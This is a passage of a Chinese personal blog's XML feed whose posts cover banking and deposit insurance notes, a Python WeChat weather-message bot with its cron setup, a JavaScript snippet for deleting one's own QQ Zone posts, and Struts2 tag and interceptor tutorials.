        <content type="html"><![CDATA[<p><strong>转载自&lt;得到APP&gt;香帅的金融课</strong></p><h1 id="银行是如何进行赚钱的。"><a href="#银行是如何进行赚钱的。" class="headerlink" title="银行是如何进行赚钱的。"></a>银行是如何进行赚钱的。</h1><p><strong>银行吸收的存款和放出去的贷款中间的利率差额叫做存贷差</strong>,是银行最重要的利润开源</p><h1 id="货币基金"><a href="#货币基金" class="headerlink" title="货币基金"></a>货币基金</h1><p>货币基金它吸收的是老百姓的零钱， 投向利率比较高的银行间货币市场， 等于说货币基金帮助老百姓分享到了机构投资者的收益。它投向的是银行间市场， 货基的收益率和银行间的市场利率是紧密相连的。如果市场上闹钱荒， 银行间利率市场的利率上升， 货币基金的利率也会飙升。</p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>时间， 它像一把利器， 如果一直不努力它会把你曾经的优势消磨,让你再次跟众人站在同一起跑线上； 那就必须要有空杯心态的能力,就是不断扔掉存量， 从零开始创造一个新的生活阶段； 未来世界没有一固定状态,所有状态都在不断的形成中不断地升级,这才是未来的常态； 人类所知非常有限,哪怕是最好的教授花了很多钱做得很好的研究,也可能是错的， 科学的最大价值并不在于固定的知识,而是在于获得这些知识的研究方法、 思维方式； 既然不能战胜时间,不如和它作朋友.愿你做一个终身学习者</p>]]></content>
      
      
      <categories>
          
          <category> 金融 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 银行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>存在银行的钱安全吗?</title>
      <link href="/2018/12/26/cun-zai-yin-xing-de-qian-an-quan-ma/"/>
      <url>/2018/12/26/cun-zai-yin-xing-de-qian-an-quan-ma/</url>
      
        <content type="html"><![CDATA[<p><strong>转载自&lt;得到APP&gt;香帅的金融课</strong></p><p>从2015年开始， 即使银行破产， 50万以下的银行存款也能够得到全额的赔付—银行存款保险制度。</p><p>上千人到银行去取现金的现象， 在金融学里面就叫做“银行挤兑”， 也叫“Bank Run”， 它是金融恐慌的一种。<br>金融市场是关于信心和未来预期的， 一旦这个信心受到摧毁， 就会发生连锁反应： 银行破产、 企业的资金链断裂， 企业倒闭， 工人失业， 再一传十， 十传百， 引起市场更大的恐慌。</p><p>存款保险制度是在美国开始起源的这个制度的好处是什么呢？ 就是即使银行发生了问题， 储户存款的安全也是得到保障的， 因为每个人最关心的是自己资金的安全， 所以只要自己的资金是安全的， 存款人挤兑的动机就会大幅地下降， 这样一来就会避免银行体系出现多米诺骨牌式的坍塌。 换句话说， 存款保险制度像什么呢？ 它就像金业的一针疫苗， 把银行挤兑传染的风险给隔离开来， 避免市场大面积的恐慌和信心崩塌。</p><p>从2015年5月1号开始， 所有的存款机构， 都必须对自己的存款进行投保， 如果银行发生问题的话， 国家的存款保险基金就会负责向存款人限额赔付， 最高的赔付额度为50万元。 也就是说， 现在只要你在一家银行的存款不超过50万， 不管银行发生什么问题， 你都能够得到全额的赔付。我们国家的存款账户99.7%都是在50万以下的， 所以就意味着， 不管是哪一种类型的银行， 绝大部分老百姓的钱都是安全的。 人性决定了我们真正关心的是自己钱的安全与否， 只要自己的钱是安全的， 就不太可能引起大面积的恐慌， 这也就是我们所谓的“存款保险制度实际上是给我们的金融系统打了一针疫苗。 ”</p><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>既然中国99.7% 存款账户是投了保险的， 但体量加起来也很巨大呀， 保险公司会不会承受不了呢？</p><ol><li>保监会CIRC补偿能力监管制度很有效。<br>在这个多级预警制度下， 如果某保险公司跌破安全线第一档（偿付能力的150%） 保监会会“盯梢”， 跌破第二档（偿付能力的100%）保监会会动用监管权力让该公司停止新业务，督促该公司恢复补偿能力。 </li><li>中国保险业CROSS偿付能力监管规则很科学。 在这个规则下， 季末、 年末各保险公司会使用该规则， 对自己进行详尽的数学模型和压力测试， 保证自己在99.5%概率下， 无论发生什么事情都不会倒闭。 </li></ol>]]></content>
      
      
      <categories>
          
          <category> 金融 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 银行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>中国银行的血统和阶级</title>
      <link href="/2018/12/26/zhong-guo-yin-xing-de-xie-tong-he-jie-ji/"/>
      <url>/2018/12/26/zhong-guo-yin-xing-de-xie-tong-he-jie-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p><strong>转载自&lt;得到APP&gt;香帅的金融课</strong></p><p>国家担保五大行，贵族血统底气旺； 股份银行靠差异， 信用微贷有形象； 地方特色城商行， 夹缝生存激进跑。 作为同时体验过三个梯队的用户来说， 最大的感受有几点：</p><ol><li>第一梯队特别像富二代， 我对你爱答不理， 那是因为你对我高攀不起； </li><li>第二梯队特别像拼一代， 我承认没有好出身， 没关系， 我用实力和努力换来一切； </li><li>第三梯队很像乡镇企业家， 平日接触机会少， 第一印象是“接地气”， 再交流发现蛮靠谱， 但需提<br>防“当地人的保守和排外”。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 金融 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 银行 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用Python追求女生</title>
      <link href="/2018/12/25/li-yong-python-zhui-nu-sheng/"/>
      <url>/2018/12/25/li-yong-python-zhui-nu-sheng/</url>
      
        <content type="html"><![CDATA[<p><strong>先来看看运行效果</strong></p><p><img src="http://a3.qpic.cn/psb?/V10Lajvl1FgUNv/*E4Xpc.9cDWOu8n7rE5qeRZxjjeqk0TBwnmgXrN.vK8!/b/dL4AAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=OARwCAAAAAADN1Y!&amp;tl=1&amp;vuin=726301387&amp;tm=1545732000&amp;sce=60-2-2&amp;rf=viewer_4" alt=""></p><p>接下来带大家进行实现</p><h1 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h1><h2 id="1-天气接口"><a href="#1-天气接口" class="headerlink" title="1:天气接口"></a>1:天气接口</h2><pre><code>http://t.weather.sojson.com/api/weather/city/101180401</code></pre><p>该接口返回的是Json数据,使用Python的Request库进行请求然后使用json()函数解析JSON,最后返回一个字典.</p><p>需要注意的是上面这段URL最后的<strong>101180401</strong>是城市代码.这里我使用的是许昌市.</p><p>文末有所有城市对应的code.</p><pre><code>{&quot;time&quot;:&quot;2018-12-25 13:00:48&quot;,&quot;cityInfo&quot;:{    &quot;city&quot;:&quot;许昌市&quot;,    &quot;cityId&quot;:&quot;101180401&quot;,    &quot;parent&quot;:&quot;河南&quot;,    &quot;updateTime&quot;:&quot;12:51&quot;},&quot;date&quot;:&quot;20181225&quot;,&quot;message&quot;:&quot;Success !&quot;,&quot;status&quot;:200,&quot;data&quot;:{    &quot;shidu&quot;:&quot;48%&quot;,    &quot;pm25&quot;:374,    &quot;pm10&quot;:0,    &quot;quality&quot;:&quot;严重污染&quot;,    &quot;wendu&quot;:&quot;6&quot;,    &quot;ganmao&quot;:&quot;老年人病人应留在室内，停止体力消耗，一般人群避免户外活动&quot;,    &quot;yesterday&quot;:{        &quot;date&quot;:&quot;24&quot;,        &quot;sunrise&quot;:&quot;07:27&quot;,        &quot;high&quot;:&quot;高温 6.0℃&quot;,        &quot;low&quot;:&quot;低温 -2.0℃&quot;,        &quot;sunset&quot;:&quot;17:20&quot;,        &quot;aqi&quot;:74,        &quot;ymd&quot;:&quot;2018-12-24&quot;,        &quot;week&quot;:&quot;星期一&quot;,        &quot;fx&quot;:&quot;东南风&quot;,        &quot;fl&quot;:&quot;&lt;3级&quot;,        &quot;type&quot;:&quot;多云&quot;,        &quot;notice&quot;:&quot;阴晴之间，谨防紫外线侵扰&quot;    },    &quot;forecast&quot;:[        {            &quot;date&quot;:&quot;25&quot;,            &quot;sunrise&quot;:&quot;07:27&quot;,            &quot;high&quot;:&quot;高温 7.0℃&quot;,            &quot;low&quot;:&quot;低温 -1.0℃&quot;,            &quot;sunset&quot;:&quot;17:21&quot;,            &quot;aqi&quot;:209,            &quot;ymd&quot;:&quot;2018-12-25&quot;,            &quot;week&quot;:&quot;星期二&quot;,            &quot;fx&quot;:&quot;东北风&quot;,            &quot;fl&quot;:&quot;3-4级&quot;,            &quot;type&quot;:&quot;多云&quot;,            &quot;notice&quot;:&quot;阴晴之间，谨防紫外线侵扰&quot;        },        {            &quot;date&quot;:&quot;26&quot;,            &quot;sunrise&quot;:&quot;07:28&quot;,            &quot;high&quot;:&quot;高温 2.0℃&quot;,            &quot;low&quot;:&quot;低温 -3.0℃&quot;,            &quot;sunset&quot;:&quot;17:21&quot;,            &quot;aqi&quot;:133,            &quot;ymd&quot;:&quot;2018-12-26&quot;,            &quot;week&quot;:&quot;星期三&quot;,            &quot;fx&quot;:&quot;东北风&quot;,            &quot;fl&quot;:&quot;3-4级&quot;,            &quot;type&quot;:&quot;阴&quot;,            &quot;notice&quot;:&quot;不要被阴云遮挡住好心情&quot;        },        {            &quot;date&quot;:&quot;27&quot;,            &quot;sunrise&quot;:&quot;07:28&quot;,            &quot;high&quot;:&quot;高温 1.0℃&quot;,            &quot;low&quot;:&quot;低温 -5.0℃&quot;,            &quot;sunset&quot;:&quot;17:22&quot;,            &quot;aqi&quot;:84,            &quot;ymd&quot;:&quot;2018-12-27&quot;,            &quot;week&quot;:&quot;星期四&quot;,            &quot;fx&quot;:&quot;东北风&quot;,            &quot;fl&quot;:&quot;3-4级&quot;,            &quot;type&quot;:&quot;多云&quot;,            &quot;notice&quot;:&quot;阴晴之间，谨防紫外线侵扰&quot;        },        {            &quot;date&quot;:&quot;28&quot;,            &quot;sunrise&quot;:&quot;07:29&quot;,            &quot;high&quot;:&quot;高温 0.0℃&quot;,            &quot;low&quot;:&quot;低温 -6.0℃&quot;,            &quot;sunset&quot;:&quot;17:23&quot;,            &quot;aqi&quot;:69,            &quot;ymd&quot;:&quot;2018-12-28&quot;,            &quot;week&quot;:&quot;星期五&quot;,            &quot;fx&quot;:&quot;东北风&quot;,            &quot;fl&quot;:&quot;3-4级&quot;,            &quot;type&quot;:&quot;多云&quot;,            &quot;notice&quot;:&quot;阴晴之间，谨防紫外线侵扰&quot;        },        {            &quot;date&quot;:&quot;29&quot;,            &quot;sunrise&quot;:&quot;07:29&quot;,            &quot;high&quot;:&quot;高温 0.0℃&quot;,            &quot;low&quot;:&quot;低温 -5.0℃&quot;,            &quot;sunset&quot;:&quot;17:23&quot;,            &quot;aqi&quot;:68,            &quot;ymd&quot;:&quot;2018-12-29&quot;,            &quot;week&quot;:&quot;星期六&quot;,            &quot;fx&quot;:&quot;东北风&quot;,            &quot;fl&quot;:&quot;&lt;3级&quot;,            &quot;type&quot;:&quot;多云&quot;,            &quot;notice&quot;:&quot;阴晴之间，谨防紫外线侵扰&quot;        }    ]}</code></pre><p>}</p><h2 id="2-对接口返回过来的数据进行处理"><a href="#2-对接口返回过来的数据进行处理" class="headerlink" title="2:对接口返回过来的数据进行处理"></a>2:对接口返回过来的数据进行处理</h2><p>提取出想要的数据</p><pre><code>city = data[&#39;cityInfo&#39;][&#39;city&#39;]  # 城市    shidu = data[&#39;data&#39;][&quot;shidu&quot;]  # 空气湿度    quality = data[&#39;data&#39;][&#39;quality&#39;]  # 污染程度    sunrise = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;sunrise&#39;]  # 日出时间    high = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;high&#39;]  # 高温    low = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;low&#39;]  # 低温    type = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;type&#39;]  # 天气类型    notice = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;notice&#39;]  # 问候语</code></pre><p>提取结果然后进行格式化处理</p><pre><code>许昌市今天❤多云❤:湿度💧45%高温 6.0℃低温 -2.0℃日出时间☀07:27空气污染程度🌚严重污染😜阴晴之间，谨防紫外线侵扰😜</code></pre><h2 id="3-利用wxpy模块发送处理过后的数据"><a href="#3-利用wxpy模块发送处理过后的数据" class="headerlink" title="3:利用wxpy模块发送处理过后的数据"></a>3:利用wxpy模块发送处理过后的数据</h2><pre><code>content = get_weather()        # 你朋友的微信名称，不是备注，也不是微信帐号。        my_friend = bot.friends().search(u&#39;未来&#39;)[0]        my_friend.send(u&quot;早安❤&quot;)        my_friend.send(content)        # 每86400秒（1天），发送1次        t = Timer(86400, send_news)        t.start()    except:        # 你的微信名称，不是微信帐号。        my_friend = bot.friends().search(&#39;Coder&#39;)[0]        my_friend.send(u&quot;今天消息发送失败了&quot;)</code></pre><h2 id="部署到Server"><a href="#部署到Server" class="headerlink" title="部署到Server"></a>部署到Server</h2><p>环境</p><ul><li>阿里云CentOS</li><li>Python3</li></ul><p>使用nohup让Python脚本后台执行</p><pre><code>nohup python3 WeChatGirl.py &amp;</code></pre><p>运行上面的命令之后会在当前目录下生成一个nohup.out文件,打开nouhp.out文件扫码登陆微信即可.</p><p>后来发现一个问题,当我将代码运行的时间间隔调整成1分钟的时候,会报错.<br>原因是运行代码之后会生成一个<strong>botoo.pkl文件</strong>,解决方法是使用crontab定时<strong>删除botoo.pkl</strong>文件即可.</p><p>编辑crontab</p><pre><code>SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name  command to be executed# 每一分钟执行一次删除*/1 * * * * root rm -rf botoo.pkl</code></pre><p>修改完之后重启crontab这样就达到了每分钟执行一次文件删除就不会报错.</p><pre><code>sudo service crond restart</code></pre><p>查看Crontab的运行日志检查Crontab是否执行</p><pre><code>cat /var/log/cron</code></pre><p><strong>可以看到每分钟都删除一次botoo.pkl文件</strong></p><pre><code>Dec 25 15:11:33 iz2ze8yfs65r3ciel5lbucz crontab[13873]: (root) LIST (root)Dec 25 15:12:01 iz2ze8yfs65r3ciel5lbucz CROND[13890]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:13:01 iz2ze8yfs65r3ciel5lbucz CROND[13911]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:14:01 iz2ze8yfs65r3ciel5lbucz CROND[13938]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:15:01 iz2ze8yfs65r3ciel5lbucz CROND[13965]: (root) CMD ( /home/staragent/bin/sa_recovery.sh)Dec 25 15:15:01 iz2ze8yfs65r3ciel5lbucz CROND[13966]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:16:01 iz2ze8yfs65r3ciel5lbucz CROND[14035]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:17:01 iz2ze8yfs65r3ciel5lbucz CROND[14062]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:18:01 iz2ze8yfs65r3ciel5lbucz CROND[14115]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:19:01 iz2ze8yfs65r3ciel5lbucz CROND[14179]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:19:57 iz2ze8yfs65r3ciel5lbucz crontab[14215]: (root) LIST (root)Dec 25 15:20:01 iz2ze8yfs65r3ciel5lbucz CROND[14219]: (root) CMD (/usr/lib64/sa/sa1 1 1)Dec 25 15:20:01 iz2ze8yfs65r3ciel5lbucz CROND[14220]: (root) CMD ( /home/staragent/bin/sa_recovery.sh)Dec 25 15:20:01 iz2ze8yfs65r3ciel5lbucz CROND[14221]: (root) CMD (rm -rf botoo.pkl)</code></pre><h1 id="完整Python代码"><a href="#完整Python代码" class="headerlink" title="完整Python代码"></a>完整Python代码</h1><pre><code>from __future__ import unicode_literalsfrom threading import Timerfrom wxpy import *import requests# bot = Bot()# city_code = 101180401# url = http://t.weather.sojson.com/api/weather/city/101180401# linux执行登陆请调用下面的这句bot = Bot(console_qr=2, cache_path=&quot;botoo.pkl&quot;)headers = {    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;,    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,    &quot;Host&quot;: &quot;t.weather.sojson.com&quot;,    &quot;Proxy-Connection&quot;: &quot;keep-alive&quot;,    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;}content = &quot;&quot;&quot;{city}今天❤{type}❤:\n湿度💧{shidu}\n{high}\n{low}\n日出时间☀{sunrise}\n空气污染程度🌚{quality}\n😜{notice}😜&quot;&quot;&quot;def get_weather():    data = requests.get(&quot;http://t.weather.sojson.com/api/weather/city/101180401&quot;, headers=headers).json()    city = data[&#39;cityInfo&#39;][&#39;city&#39;]  # 城市    shidu = data[&#39;data&#39;][&quot;shidu&quot;]  # 空气湿度    quality = data[&#39;data&#39;][&#39;quality&#39;]  # 污染程度    sunrise = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;sunrise&#39;]  # 日出时间    high = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;high&#39;]  # 高温    low = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;low&#39;]  # 低温    type = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;type&#39;]  # 天气类型    notice = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;notice&#39;]  # 问候语    return content.format(city=city, type=type, shidu=shidu, high=high, low=low, sunrise=sunrise, quality=quality,                          notice=notice)def send_news():    try:        content = get_weather()        # 你朋友的微信名称，不是备注，也不是微信帐号。        my_friend = bot.friends().search(u&#39;未来&#39;)[0]        my_friend.send(u&quot;早安❤&quot;)        my_friend.send(content)        # 每86400秒（1天），发送1次        t = Timer(86400, send_news)        t.start()    except:        # 你的微信名称，不是微信帐号。        my_friend = bot.friends().search(&#39;Coder&#39;)[0]        my_friend.send(u&quot;今天消息发送失败了&quot;)if __name__ == &quot;__main__&quot;:    send_news()</code></pre><h1 id="城市code"><a href="#城市code" class="headerlink" title="城市code"></a>城市code</h1><pre><code>http://cdn.sojson.com/_city.json</code></pre><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>在这个快节奏的都市中,没有几个人会在有限的生命力花时间和精力慢慢走进你的内心去发现你的内在美的.</p><p>写出漂亮的代码,做一个帅气的程序员.</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=364901&auto=1&height=66"></iframe>]]></content>
      
      
      <categories>
          
          <category> PythonApplication </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JavaScript批量删除说说</title>
      <link href="/2018/12/24/javascript-pi-liang-shan-chu-shuo-shuo/"/>
      <url>/2018/12/24/javascript-pi-liang-shan-chu-shuo-shuo/</url>
      
        <content type="html"><![CDATA[<p>使用浏览器打开QQ空间-&gt;说说-&gt;F12打开浏览器的开发者模式输入下面的Js代码</p><pre><code>var delay = 1000;        //变量function del() {    //删除方法    document.querySelector(&#39;.app_canvas_frame&#39;).contentDocument.querySelector(&#39;.del_btn&#39;).click();    setTimeout(&quot;yes()&quot;, delay);}function yes() {    //点击确认删除的方法    document.querySelector(&#39;.qz_dialog_layer_btn&#39;).click();    setTimeout(&quot;del()&quot;, delay);}del();</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2Input逻辑视图</title>
      <link href="/2018/12/22/struts2input-luo-ji-shi-tu/"/>
      <url>/2018/12/22/struts2input-luo-ji-shi-tu/</url>
      
        <content type="html"><![CDATA[<p>Action接口中提供了五个逻辑视图的名称：</p><ol><li>success</li><li>input</li><li>none</li><li>login</li><li><p>error</p><pre><code> public static final String SUCCESS = &quot;success&quot;; public static final String NONE = &quot;none&quot;; public static final String ERROR = &quot;error&quot;; public static final String INPUT = &quot;input&quot;; public static final String LOGIN = &quot;login&quot;;</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2的标签库</title>
      <link href="/2018/12/22/struts2-de-biao-qian-ku/"/>
      <url>/2018/12/22/struts2-de-biao-qian-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="Struts2的标签库"><a href="#Struts2的标签库" class="headerlink" title="Struts2的标签库"></a>Struts2的标签库</h1><p>在Struts2的安装文件-&gt;docs-&gt;tag-reference.html文件中查看Struts2的通用标签库</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/CjEgWhu08Q9KjewXPg*v0n3*i9eWleVAhsL*tskPU0E!/b/dLYAAAAAAAAA&amp;bo=nAQ4BAAAAAADJ6Y!&amp;rf=viewer_4" alt="Struts2的通用标签库"></p><h2 id="UI标签库"><a href="#UI标签库" class="headerlink" title="UI标签库"></a>UI标签库</h2><p>UI标签库一大特点是方便数据回显,而且相比传统HTML标签更加漂亮.</p><pre><code>&lt;h2&gt;普通表单&lt;/h2&gt;        &lt;form action=&quot;${ pageContext.request.contextPath}/uiAction.action&quot; method=&quot;post&quot;&gt;        &lt;!-- 隐藏字段 --&gt;            &lt;input type=&quot;hidden&quot; name=&quot;userId&quot;&gt;            用户名:&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;            密码:&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;            年龄:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;&lt;br&gt;            性别:&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;男&quot;&gt;男            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;女&quot;&gt;女&lt;br&gt;             籍贯&lt;select name=&quot;city&quot;&gt;                &lt;option value=&quot;&quot;&gt;---请选择---&lt;/option&gt;                &lt;option value=&quot;北京&quot;&gt;北京&lt;/option&gt;                &lt;option value=&quot;广州&quot;&gt;广州&lt;/option&gt;                &lt;option value=&quot;郑州&quot;&gt;郑州&lt;/option&gt;            &lt;/select&gt;&lt;br&gt;             爱好:&lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;篮球&quot;&gt;篮球            &lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;足球&quot;&gt;足球            &lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;电脑&quot;&gt;电脑            &lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;编程&quot;&gt;编程&lt;br&gt;            介绍:&lt;textarea rows=&quot;2&quot; cols=&quot;10&quot; name=&quot;info&quot;&gt;I like Java&lt;/textarea&gt;            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;        &lt;/form&gt;        &lt;s:debug&gt;&lt;/s:debug&gt;        &lt;h2&gt;UI表单&lt;/h2&gt;        &lt;s:form action=&quot;uiAction&quot; namespace=&quot;/&quot; method=&quot;post&quot;&gt;            &lt;s:hidden name=&quot;userId&quot;&gt;&lt;/s:hidden&gt;            &lt;s:textfield name=&quot;name&quot; label=&quot;用户名&quot;&gt;&lt;/s:textfield&gt;            &lt;s:password name=&quot;password&quot; label=&quot;密码&quot; showPassword=&quot;true&quot;&gt;&lt;/s:password&gt;    &lt;!-- 密码默认不回显需要加上 showPassword=&quot;true&quot;--&gt;            &lt;s:textfield name=&quot;age&quot; label=&quot;年龄&quot;&gt;&lt;/s:textfield&gt;            &lt;s:radio list=&quot;{&#39;男&#39;,&#39;女&#39;}&quot; name=&quot;sex&quot; label=&quot;性别&quot;&gt;&lt;/s:radio&gt;            &lt;s:select list=&quot;{&#39;北京&#39;,&#39;广州&#39;,&#39;郑州&#39;}&quot; name=&quot;city&quot; label=&quot;籍贯&quot; headerKey=&quot;&quot; headerValue=&quot;---请选择---&quot;&gt;&lt;/s:select&gt;            &lt;s:checkboxlist list=&quot;#{&#39;篮球&#39;:&#39;篮球&#39;,&#39;足球&#39;:&#39;足球&#39;,&#39;电脑&#39;:&#39;电脑&#39;,&#39;编程&#39;:&#39;编程&#39;}&quot; name=&quot;bobby&quot; label=&quot;爱好&quot;&gt;&lt;/s:checkboxlist&gt;            &lt;s:textarea name=&quot;info&quot; cols=&quot;10&quot; rows=&quot;2&quot; label=&quot;介绍&quot; value=&quot;IlikeJava&quot;&gt;&lt;/s:textarea&gt;            &lt;s:submit value=&quot;提交&quot;&gt;&lt;/s:submit&gt;        &lt;/s:form&gt;    &lt;/center&gt;</code></pre><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/XsO361zx3Bphd*RZobHoETK8OFFLV*8P9oz4RL2m.6A!/b/dFQBAAAAAAAA&amp;bo=OAQFBQAAAAADBx4!&amp;rf=viewer_4" alt="普通标签和UI标签的对比"></p><p>来看看对比:</p><ol><li>普通表单美观度没有<strong>Struts2UI表单美观度好</strong></li><li>普通HTML标签代码量比Struts2要多很多,<strong>Struts2标签写起来简单</strong>.</li><li>普通Html标签没有回显功能,<strong>Struts2的UI标签自带回显功能</strong></li></ol><p><strong>Struts2的回显的数据是从ValueStack中获取的.</strong></p><h2 id="通用标签库"><a href="#通用标签库" class="headerlink" title="通用标签库"></a>通用标签库</h2><ul><li>判断标签<ol><li>&lt;s:if&gt;</li><li>&lt;s:elseif&gt;</li><li>&lt;s:else&gt;</li></ol></li><li>迭代标签<ol><li>&lt;s:iterator&gt;</li></ol></li><li>属性标签<ol><li>&lt;s:property&gt;</li></ol></li><li>调试标签<ol><li>&lt;s:debug&gt;</li></ol></li><li>日期标签<ol><li>&lt;s:date&gt;</li></ol></li></ul><p>Iterator标签使用案例</p><pre><code>&lt;center&gt;             &lt;s:iterator var=&quot;i&quot; value=&quot;{&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;}&quot;&gt;                 &lt;s:property value=&quot;#i&quot;/&gt;             &lt;/s:iterator&gt;             &lt;hr&gt;             &lt;!-- 遍历map --&gt;             &lt;s:iterator var=&quot;m&quot; value=&quot;#{&#39;name&#39;:&#39;张三&#39;,&#39;age&#39;:27,&#39;hobby&#39;:&#39;Programme&#39;}&quot;&gt;                 &lt;s:property value=&quot;#m.key&quot;/&gt; -------------&gt;&lt;s:property value=&quot;#m.value&quot;/&gt;&lt;br&gt;             &lt;/s:iterator&gt;             &lt;hr&gt;             &lt;!-- 循环 --&gt;             &lt;s:iterator var=&quot;i&quot; begin=&quot;1&quot; end=&quot;20&quot; step=&quot;1&quot;&gt;                 &lt;s:property value=&quot;#i&quot; /&gt;&lt;br&gt;             &lt;/s:iterator&gt;             &lt;hr&gt;             &lt;!-- iterator中status的应用,Status用来记录循环的状态 --&gt;             &lt;s:iterator var=&quot;i&quot; begin=&quot;1&quot; end=&quot;20&quot; step=&quot;2&quot; status=&quot;status&quot;&gt;                 &lt;s:if test=&quot;#status.count % 3 == 0&quot;&gt;                     &lt;font color=&quot;blue&quot;&gt;&lt;s:property value=&quot;#i&quot;/&gt;&lt;/font&gt;                 &lt;/s:if&gt;                 &lt;s:else&gt;                     &lt;font color=&quot;green&quot;&gt;&lt;s:property value=&quot;#i&quot;/&gt;&lt;/font&gt;                 &lt;/s:else&gt;             &lt;/s:iterator&gt;&lt;/center&gt;</code></pre><p>判断标签的使用案例</p><pre><code>&lt;s:set var=&quot;i&quot; value=&quot;3&quot; scope=&quot;request&quot;&gt;&lt;/s:set&gt;&lt;s:if test=&quot;#request.i&gt;3&quot;&gt;    i大于3&lt;/s:if&gt;&lt;s:elseif test=&quot;#request.i&lt;3&quot;&gt;    i小于3&lt;/s:elseif&gt;&lt;s:else&gt;    i等于3 &lt;/s:else&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2中的拦截器</title>
      <link href="/2018/12/22/struts2-zhong-de-lan-jie-qi/"/>
      <url>/2018/12/22/struts2-zhong-de-lan-jie-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是拦截器"><a href="#什么是拦截器" class="headerlink" title="什么是拦截器"></a>什么是拦截器</h1><ul><li>Interceptor：拦截器，起到拦截Action的作用。<ul><li>Interceptor：拦截器，拦截是客户端对Action的访问。更细粒度化的拦截。（拦截Action中的具体的方法）。<br>Struts2框架核心的功能都是依赖拦截器实现。</li></ul></li><li>Filter：过滤器，过滤从客户端向服务器发送的请求。</li></ul><h1 id="Struts2的执行流程"><a href="#Struts2的执行流程" class="headerlink" title="Struts2的执行流程"></a>Struts2的执行流程</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/5sIReyNv*kZeGD6FsWrCZTWCHOmtQmpKAPDrTdmJkZI!/b/dDcBAAAAAAAA&amp;bo=JAI6AgAAAAARBy4!&amp;rf=viewer_4" alt="Struts2执行流程图"></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/8rjImMd3RHjD*iHhf4Ba96Xz5EAIUiULhmSfp6sIHmg!/b/dL8AAAAAAAAA&amp;bo=PwU4BAAAAAARFyY!&amp;rf=viewer_4" 